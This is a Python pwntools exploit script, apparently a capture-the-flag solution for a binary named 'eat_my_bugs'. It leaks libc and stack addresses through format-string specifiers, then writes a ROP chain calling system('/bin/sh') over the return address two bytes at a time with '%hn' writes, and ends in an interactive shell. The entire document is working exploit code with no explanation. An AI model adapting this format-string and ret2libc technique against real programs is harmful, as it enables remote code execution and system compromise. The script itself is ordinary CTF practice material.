from pwn import *
import sys

libc = ELF("libc.so.6")

context.arch = 'amd64'
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def connect(env='debug'):
    if env == 'debug':
        io = process(elf.path)
        gdb.attach(io, gdbscript='''
            b *main
        ''')
    elif env == 'local':
        io = remote("localhost", 4000, timeout=3)
    elif env == 'remote':
        io = remote("eat_my_bugs.zajebistyc.tf", 8001, timeout=3)
    else:
        log.error('Invalid environment')
        exit(0)
    return io

def read_name(name=b'cafe'):
    io.sendafter(b'name: ', name)

def read_elements(e):
    io.sendafter(b'plate: ', e)

def make_plate(cnt=2, food=[2, 2], idx=[7, 7]):
    assert len(food) == cnt and len(idx) == cnt, 'Invalid input!'
    for i in range(cnt):
        r = io.sendlineafter(b'food: ', str(food[i]).encode())
        r = io.sendlineafter(b'Idx: ', str(idx[i]).encode())

def get_plate():
    head = b'plate:\n'
    tail = b'Tell '
    io.recvuntil(head)
    return io.recvuntil(tail)[:-len(tail)]

def do_loop(e):
    read_name()
    read_elements(e)
    make_plate()
    return get_plate()

def create_payload(addr, ctx):
    p = b'2'
    p += b'%%%dc%%8$hn' % ((0x10000 + ctx - 1) % 0x10000)
    p = p.ljust(0x10, b'\x00')
    p += p64(addr)
    return p

libc_start_call_main_oft = 0x23a90
i_addr_oft = 0x104
ret_addr_oft = 0xf8

if __name__ == '__main__':
    io = connect(env='local')

    # libc and stack addr leak in the first loop
    p = b'2  %19$p  %20$p  %21$p'
    r = do_loop(p).split(b'  ')
    libc.address = int(r[1].decode(), 16) - libc_start_call_main_oft
    i_addr = int(r[2].decode(), 16) - i_addr_oft
    ret_addr = int(r[2].decode(), 16) - ret_addr_oft
    log.info(f'&i for loop: {hex(i_addr)}\nlibc addr: {hex(libc.address)}')

    ropchain = p64(next(libc.search(asm('pop rdi; ret'), executable=True)))
    ropchain += p64(next(libc.search(b'/bin/sh\x00')))
    ropchain += p64(next(libc.search(asm('ret'), executable=True)))
    ropchain += p64(libc.sym["system"])

    # increate the number of loop
    do_loop(create_payload(i_addr + 2, 0xffff))
    
    oft = 0
    while True:
        do_loop(create_payload(ret_addr + oft, u16(ropchain[oft:oft+2]) & 0xffff))
        oft += 2
        if oft == len(ropchain):
            break
    
    do_loop(create_payload(i_addr + 2, 0x0))

    io.interactive()